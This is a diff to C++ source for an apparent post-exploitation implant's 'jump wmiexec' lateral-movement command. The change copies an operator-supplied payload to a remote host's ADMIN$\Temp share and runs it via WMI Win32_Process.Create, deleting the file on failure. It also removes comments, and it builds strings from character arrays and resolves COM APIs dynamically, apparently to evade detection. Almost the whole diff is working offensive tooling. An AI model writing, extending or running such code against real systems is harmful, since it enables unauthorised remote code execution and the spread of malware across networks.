@@ -10,7 +10,6 @@
 using namespace stardust;
 using namespace starburst;
 
-// COM GUIDs
 static const GUID CLSID_WbemLocator   = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
 static const GUID IID_IWbemLocator     = { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
 
@@ -20,7 +19,6 @@ typedef HRESULT (WINAPI *fnCoCreateInstance)( REFCLSID, LPUNKNOWN, DWORD, REFIID
 typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );
 typedef HRESULT (WINAPI *fnCoSetProxyBlanket)( IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD );
 
-// minimal IWbemLocator vtable
 struct IWbemLocatorVtbl {
     void* QueryInterface;
     void* AddRef;
@@ -29,37 +27,35 @@ struct IWbemLocatorVtbl {
 };
 struct IWbemLocator_s { IWbemLocatorVtbl* lpVtbl; };
 
-// minimal IWbemServices vtable
 struct IWbemServicesVtbl {
     void* QueryInterface;
     void* AddRef;
     ULONG (STDMETHODCALLTYPE *Release)( void* );
-    void* pad[3]; // OpenNamespace, CancelAsyncCall, QueryObjectSink
+    void* pad[3];
     HRESULT (STDMETHODCALLTYPE *GetObject)( void*, BSTR, LONG, void*, void**, void** );
-    void* pad2[2]; // GetObjectAsync, PutInstance
-    void* pad3[2]; // PutInstanceAsync, DeleteInstance
-    void* pad4[2]; // DeleteInstanceAsync, CreateInstanceEnum
-    void* pad5[2]; // CreateInstanceEnumAsync, ExecQuery
-    void* pad6;    // ExecQueryAsync
-    void* pad7;    // ExecNotificationQuery
-    void* pad8;    // ExecNotificationQueryAsync
+    void* pad2[2];
+    void* pad3[2];
+    void* pad4[2];
+    void* pad5[2];
+    void* pad6;
+    void* pad7;
+    void* pad8;
     HRESULT (STDMETHODCALLTYPE *ExecMethod)( void*, BSTR, BSTR, LONG, void*, void*, void**, void** );
 };
 struct IWbemServices_s { IWbemServicesVtbl* lpVtbl; };
 
-// minimal IWbemClassObject vtable
 struct IWbemClassObjectVtbl {
     void* QueryInterface;
     void* AddRef;
     ULONG (STDMETHODCALLTYPE *Release)( void* );
-    void* pad[7]; // GetQualifierSet, Get, Put, Delete, GetNames, BeginEnumeration, Next
-    void* pad2[3]; // EndEnumeration, GetPropertyQualifierSet, Clone
-    void* pad3;    // GetObjectText
+    void* pad[7];
+    void* pad2[3];
+    void* pad3;
     HRESULT (STDMETHODCALLTYPE *SpawnInstance)( void*, LONG, void** );
-    void* pad4;    // SpawnDerivedClass
-    void* pad5;    // CompareTo
-    void* pad6;    // GetPropertyOrigin
-    void* pad7b;   // InheritsFrom
+    void* pad4;
+    void* pad5;
+    void* pad6;
+    void* pad7b;
     HRESULT (STDMETHODCALLTYPE *GetMethod)( void*, BSTR, LONG, void**, void** );
     HRESULT (STDMETHODCALLTYPE *PutMethod)( void*, BSTR, LONG, void*, void* );
 };
@@ -81,20 +77,73 @@ auto declfn starburst::cmd_jump_wmiexec(
         return;
     }
 
-    uint32_t command_len = 0;
-    auto command_str = parser_string( params, &command_len );
-    if ( !command_str || command_len == 0 ) {
+    uint32_t filename_len = 0;
+    auto filename_str = parser_string( params, &filename_len );
+    if ( !filename_str || filename_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            symbol<char*>( const_cast<char*>( "no filename provided" ) ) );
         return;
     }
 
+    uint32_t payload_len = 0;
+    auto payload_data = reinterpret_cast<uint8_t*>( parser_bytes( params, &payload_len ) );
+    if ( !payload_data || payload_len == 0 ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "no payload data provided" ) ) );
+        return;
+    }
+
+    // build UNC path: \\host\ADMIN$\Temp\filename
+    char unc_path[512] = { '\\', '\\', 0 };
+    int uidx = 2;
+    for ( uint32_t i = 0; i < host_len && uidx < 480; i++ )
+        unc_path[uidx++] = host_str[i];
+    char admin_suffix[] = { '\\','A','D','M','I','N','$','\\','T','e','m','p','\\', 0 };
+    for ( int i = 0; admin_suffix[i] && uidx < 500; i++ )
+        unc_path[uidx++] = admin_suffix[i];
+    for ( uint32_t i = 0; i < filename_len && uidx < 510; i++ )
+        unc_path[uidx++] = filename_str[i];
+    unc_path[uidx] = 0;
+
+    // wide UNC for cleanup
+    wchar_t w_unc[512] = {};
+    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, unc_path, uidx, w_unc, 511 );
+
+    // build exec path: C:\Windows\Temp\filename
+    char exec_path[512] = { 'C',':','\\','W','i','n','d','o','w','s','\\','T','e','m','p','\\', 0 };
+    int eidx = 16;
+    for ( uint32_t i = 0; i < filename_len && eidx < 510; i++ )
+        exec_path[eidx++] = filename_str[i];
+    exec_path[eidx] = 0;
+
+    // stage payload to UNC path
+    HANDLE h_file = inst.kernel32.CreateFileA(
+        unc_path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr );
+    if ( h_file == INVALID_HANDLE_VALUE ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "failed to create file on remote host - check ADMIN$ access" ) ) );
+        return;
+    }
+
+    DWORD written = 0;
+    BOOL write_ok = inst.kernel32.WriteFile( h_file, payload_data, payload_len, &written, nullptr );
+    inst.kernel32.CloseHandle( h_file );
+
+    if ( !write_ok || written != payload_len ) {
+        inst.kernel32.DeleteFileW( w_unc );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "failed to write payload to remote host" ) ) );
+        return;
+    }
+
+    // resolve COM APIs
     HMODULE h_ole32 = inst.kernel32.LoadLibraryA(
         symbol<char*>( const_cast<char*>( "ole32.dll" ) ) );
     HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA(
         symbol<char*>( const_cast<char*>( "oleaut32.dll" ) ) );
 
     if ( !h_ole32 || !h_oleaut32 ) {
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
         return;
@@ -124,6 +173,7 @@ auto declfn starburst::cmd_jump_wmiexec(
 
     if ( !pCoInitializeEx || !pCoCreateInstance || !pCoSetProxyBlanket ||
          !pSysAllocString || !pSysFreeString ) {
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
         return;
@@ -135,7 +185,6 @@ auto declfn starburst::cmd_jump_wmiexec(
         pCoInitializeSecurity( nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
     }
 
-    // build WMI namespace string: \\HOST\root\cimv2
     wchar_t ns[512] = { '\\', '\\', 0 };
     int ns_idx = 2;
     for ( uint32_t i = 0; i < host_len && ns_idx < 500; i++ )
@@ -149,6 +198,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     hr = pCoCreateInstance( CLSID_WbemLocator, nullptr, 1, IID_IWbemLocator, reinterpret_cast<void**>( &pLoc ) );
     if ( FAILED( hr ) || !pLoc ) {
         pCoUninitialize();
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CoCreateInstance WbemLocator failed" ) ) );
         return;
@@ -162,6 +212,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     if ( FAILED( hr ) || !pSvc ) {
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "ConnectServer failed - check perms/network" ) ) );
         return;
@@ -169,7 +220,6 @@ auto declfn starburst::cmd_jump_wmiexec(
 
     pCoSetProxyBlanket( reinterpret_cast<IUnknown*>( pSvc ), 10, 0, nullptr, 6, 3, nullptr, 0 );
 
-    // Get Win32_Process class
     wchar_t w32p[] = { 'W','i','n','3','2','_','P','r','o','c','e','s','s', 0 };
     BSTR bstr_class = pSysAllocString( w32p );
 
@@ -180,12 +230,12 @@ auto declfn starburst::cmd_jump_wmiexec(
         pSvc->lpVtbl->Release( pSvc );
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetObject Win32_Process failed" ) ) );
         return;
     }
 
-    // Get Create method input params
     wchar_t create_meth[] = { 'C','r','e','a','t','e', 0 };
     BSTR bstr_method = pSysAllocString( create_meth );
 
@@ -198,24 +248,19 @@ auto declfn starburst::cmd_jump_wmiexec(
         pSvc->lpVtbl->Release( pSvc );
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetMethod Create failed" ) ) );
         return;
     }
 
-    // Spawn instance and set CommandLine
     IWbemClassObject_s* pInInst = nullptr;
     pInParams->lpVtbl->SpawnInstance( pInParams, 0, reinterpret_cast<void**>( &pInInst ) );
 
-    // build command: cmd.exe /c <command>
+    // execute the staged payload directly (no cmd.exe wrapper)
     wchar_t w_cmd[2048] = {};
-    wchar_t cmd_prefix[] = { 'c','m','d','.','e','x','e',' ','/','c',' ', 0 };
-    int cidx = 0;
-    for ( ; cmd_prefix[cidx]; cidx++ ) w_cmd[cidx] = cmd_prefix[cidx];
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_cmd + cidx, 2048 - cidx - 1 );
+    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, exec_path, eidx, w_cmd, 2047 );
 
-    // Set CommandLine via Put (index 3 in vtable)
-    // We need IWbemClassObject::Put which is at vtable index 5
     typedef HRESULT (STDMETHODCALLTYPE *fnPut)( void*, BSTR, LONG, void*, LONG );
     auto pPut = reinterpret_cast<fnPut>( reinterpret_cast<void**>( pInInst->lpVtbl )[5] );
 
@@ -230,7 +275,6 @@ auto declfn starburst::cmd_jump_wmiexec(
     hr = pPut( pInInst, bstr_cl, 0, &var, 0 );
     pSysFreeString( bstr_cl );
 
-    // Execute Win32_Process.Create
     IWbemClassObject_s* pOutParams = nullptr;
     hr = pSvc->lpVtbl->ExecMethod( pSvc, bstr_class, bstr_method, 0, nullptr,
         pInInst, reinterpret_cast<void**>( &pOutParams ), nullptr );
@@ -249,10 +293,11 @@ auto declfn starburst::cmd_jump_wmiexec(
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "process created via WMI" ) ) );
+            symbol<char*>( const_cast<char*>( "payload staged and executed via WMI" ) ) );
     } else {
+        inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "WMI ExecMethod failed" ) ) );
+            symbol<char*>( const_cast<char*>( "payload staged but WMI ExecMethod failed" ) ) );
     }
 }
 
